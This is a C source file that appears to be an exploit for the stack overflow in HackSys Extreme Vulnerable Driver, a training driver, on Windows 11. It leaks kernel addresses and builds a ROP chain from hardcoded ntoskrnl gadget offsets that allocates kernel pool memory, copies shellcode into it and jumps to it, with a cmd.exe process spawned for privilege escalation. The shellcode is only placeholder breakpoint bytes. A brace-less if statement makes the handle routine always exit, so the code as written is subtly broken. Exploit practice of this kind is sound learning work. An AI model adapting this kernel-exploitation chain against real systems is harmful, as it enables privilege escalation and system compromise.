/*
HEVD TriggerBufferOverflowStack
OS Name	Microsoft Windows 11 Pro
Version	10.0.22631 Build 22631
*/

#include <Windows.h>
#include <Psapi.h>
#include <stdio.h>
#include <stdbool.h>

#define DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
#define STACK_OVERFLOW_IOCTL_NUMBER     IOCTL(0x800)

// GADGETS
unsigned long long g_xor_ecx_ecx_mov_rax_rcx_ret = 0x00000000002da11a;
unsigned long long g_pop_rdx_ret = 0x0000000000350ba2;
unsigned long long g_add_rsp_0x20_ret = 0x0000000000af774a;
unsigned long long g_push_rax_ret = 0x0000000000227f61;
unsigned long long g_pop_rcx_ret = 0x000000000020d810;
unsigned long long g_pop_r8_ret = 0x000000000025bad8;
unsigned long long g_jmp_rbx = 0x000000000023a21d;
unsigned long long kernel_ExAllocatePoolWithTag;
unsigned long long kernel_memcpy;

// ELEVATED PROCESS
DWORD pid;

// Error func
void Error() {
    printf("Entering error\n");
    long int errorCode = GetLastError();
    LPTSTR errorText = NULL;

    FormatMessage(
        FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        errorCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR)&errorText,
        0,
        NULL
    );

    printf("%ls\n", errorText);

    exit(-1);
}

// Gets kernel base addr
unsigned long long get_kernel_base_addr() {
    printf("Entering get_kernel_base_addr\n");
    LPVOID drivers[1024];
    DWORD cbNeeded;

    EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);

    return (unsigned long long)drivers[0];
}

PVOID get_kernel_symbol_addr(const char* symbol) {
    printf("Entering get_kernel_symbol_addr\n");
    PVOID kernelBaseAddr;
    HMODULE userKernelHandle;
    PCHAR functionAddress;
    unsigned long long offset;

    kernelBaseAddr = (PVOID)get_kernel_base_addr();
    userKernelHandle = LoadLibraryA("ntoskrnl.exe");

    if (userKernelHandle == INVALID_HANDLE_VALUE) {
        printf("Error getting userKernelHandle\n");
        Error();
    }

    functionAddress = (PCHAR)GetProcAddress(userKernelHandle, symbol);
    if (functionAddress == NULL) {
        printf("Error getting functionAddress\n");
        Error();
    }

    offset = functionAddress - ((PCHAR)userKernelHandle);
    return (PVOID)(((PCHAR)kernelBaseAddr) + offset);
}

// Get handle to driver
HANDLE get_handle() {
    printf("Entering get_handle\n");
    // Handle to device
    HANDLE hDevice = CreateFileA(
        DEVICE_NAME,
        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE)
        printf("Error getting device handle\n");
        Error();

    return hDevice;
}

// Add payload
void add_payload(char* in_buffer, SIZE_T* offset, unsigned long long* data, SIZE_T size) {
    printf("Entering add_payload\n");
    memcpy(in_buffer + *offset, data, size);
    printf("Wrote %lx to offset %u\n", *data, *offset);
    *offset += size;
}

// Spawn shell
DWORD spawnCmd() {
    printf("Entering spawnCmd\n");
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char cmd[] = "C:\\Windows\\System32\\cmd.exe";

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Child process
    if (!CreateProcess(NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        printf("Error creating Cmd\n");
        Error();
    }
        

    return pi.dwProcessId;
    
}

// Shellcode
char* gen_shellcode() {
    printf("Entering gen_shellcode\n");
    char* shellcode = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 64);
    memset(shellcode, 0xcc, 64);
    return shellcode;
}


// Main func
int main() {
    printf("Entering main\n");
    HANDLE hDevice = get_handle();

    SIZE_T in_buffer_size = 2072 + 8 * 7 + 0x20; // 2072 is the offset; there are 7 8-byte long gadgets and an add rsp, 0x20.

    // Memory for buffer
    PULONG in_buffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, in_buffer_size);
    memset((char*)in_buffer, 'A', in_buffer_size);

    SIZE_T offset = 2072;

    // Cmd
    pid = spawnCmd();

    // Adjuts offsets
    unsigned long long kernel_base_addr = get_kernel_base_addr();
    g_xor_ecx_ecx_mov_rax_rcx_ret += kernel_base_addr;
    g_pop_rdx_ret += kernel_base_addr;
    g_add_rsp_0x20_ret += kernel_base_addr;
    g_push_rax_ret += kernel_base_addr;
    g_pop_rcx_ret += kernel_base_addr;
    g_pop_r8_ret += kernel_base_addr;
    g_jmp_rbx += kernel_base_addr;

    kernel_ExAllocatePoolWithTag = (unsigned long long) get_kernel_symbol_addr("ExAllocatePoolWithTag");
    kernel_memcpy = (unsigned long long) get_kernel_symbol_addr("memcpy");

    // Shellcode
    char* shellcode = gen_shellcode();

    //Arbitrary size of our shellcode
    unsigned long long size_of_copy = 0x100;

    // Exploit
    add_payload((char*)in_buffer, &offset, &g_xor_ecx_ecx_mov_rax_rcx_ret, 8);
    add_payload((char*)in_buffer, &offset, &g_pop_rdx_ret, 8);
    add_payload((char*)in_buffer, &offset, &size_of_copy, 8);
    add_payload((char*)in_buffer, &offset, &kernel_ExAllocatePoolWithTag, 8);
    add_payload((char*)in_buffer, &offset, &g_add_rsp_0x20_ret, 8);
    offset += 0x20;

    add_payload((char*)in_buffer, &offset, &g_push_rax_ret, 8);
    add_payload((char*)in_buffer, &offset, &g_pop_rcx_ret, 8);
    add_payload((char*)in_buffer, &offset, &g_pop_rdx_ret, 8);
    add_payload((char*)in_buffer, &offset, (unsigned long long*)(&shellcode), 8);
    add_payload((char*)in_buffer, &offset, &g_pop_r8_ret, 8);
    add_payload((char*)in_buffer, &offset, &size_of_copy, 8);
    add_payload((char*)in_buffer, &offset, &kernel_memcpy, 8);
    add_payload((char*)in_buffer, &offset, &g_jmp_rbx, 8);
    
    system("pause");
    printf("Sending buffer\n");
    bool result = DeviceIoControl(hDevice, STACK_OVERFLOW_IOCTL_NUMBER, in_buffer, (DWORD)in_buffer_size, NULL, 0, NULL, NULL);
    if (!result) {
        printf("Error triggering BoF\n");
        Error();
    }

    HeapFree(GetProcessHeap(), 0, (LPVOID)in_buffer);


    // Exit. TODO: remove
    printf("Success");
    getchar();
    return 0;
}
